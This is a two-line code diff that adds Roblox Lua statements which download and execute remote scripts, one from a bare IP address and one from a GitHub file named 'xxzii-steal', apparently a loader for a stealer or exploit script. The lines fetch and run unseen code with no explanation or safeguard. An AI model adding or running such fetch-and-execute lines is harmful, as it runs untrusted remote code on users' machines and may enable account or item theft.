@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sscxzii/Open-Source-To-GitHub/refs/heads/main/xxzii-steal"))()
